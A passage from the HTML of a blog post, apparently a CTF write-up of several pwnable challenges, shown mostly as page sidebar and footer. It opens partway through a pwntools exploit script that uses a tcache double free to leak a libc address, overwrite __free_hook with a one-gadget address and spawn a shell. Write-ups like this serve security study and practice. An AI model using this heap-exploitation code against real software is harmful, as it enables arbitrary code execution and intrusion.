class="keyword">def</span> <span class="title">view</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">50</span>,p64(stdin))</span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;CCCC&#x27;</span>)</span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">view()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;inside\n&#x27;</span>)</span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&quot;\x00\x00&quot;</span>)</span><br><span class="line">leak = leak + <span class="number">0x76</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line"></span><br><span class="line">libcbase = leak - <span class="number">0x3ec680</span></span><br><span class="line">malloc_hook = libcbase + <span class="number">0x3ebc30</span></span><br><span class="line">free_hook = libcbase + <span class="number">0x3ed8e8</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3c2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">60</span>,<span class="string">&#x27;AAAAA&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">60</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">60</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">60</span>,p64(oneshot))</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/pwnable/" rel="tag"># pwnable</a>
+              <a href="/tags/write-up/" rel="tag"># write-up</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/12/2021-03-13-UT_CTF_2021/" rel="prev" title="2021 UT CTF">
+      <i class="fa fa-chevron-left"></i> 2021 UT CTF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/05/24/2021-05-25-Clop/" rel="next" title="Clop Ransomware">
+      Clop Ransomware <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Birdie-pwnable"><span class="nav-number">1.</span> <span class="nav-text">Birdie (pwnable)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerability"><span class="nav-number">1.1.</span> <span class="nav-text">vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">1.2.</span> <span class="nav-text">exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Signal-dROPper-pwnable"><span class="nav-number">2.</span> <span class="nav-text">Signal dROPper (pwnable)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerability-1"><span class="nav-number">2.1.</span> <span class="nav-text">vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit-1"><span class="nav-number">2.2.</span> <span class="nav-text">exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Returning-2-pwnable"><span class="nav-number">3.</span> <span class="nav-text">Returning-2 (pwnable)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerability-2"><span class="nav-number">3.1.</span> <span class="nav-text">vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit-2"><span class="nav-number">3.2.</span> <span class="nav-text">exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cache-7-pwnable"><span class="nav-number">4.</span> <span class="nav-text">Cache_7 (pwnable)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerability-3"><span class="nav-number">4.1.</span> <span class="nav-text">vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit-3"><span class="nav-number">4.2.</span> <span class="nav-text">exploit</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rvkhun" src="/images/raccoon1.jpg">
+  <p class="site-author-name" itemprop="name">rvkhun</p>
+  <div class="site-description" itemprop="description">Security Researcher / CTF Player</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:pwnkidhn@gmail.com" title="E-Mail → mailto:pwnkidhn@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://instagram.com/_choizy_" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;_choizy_" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-instagram"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rvkhun</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Gemini</a>
+  </div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
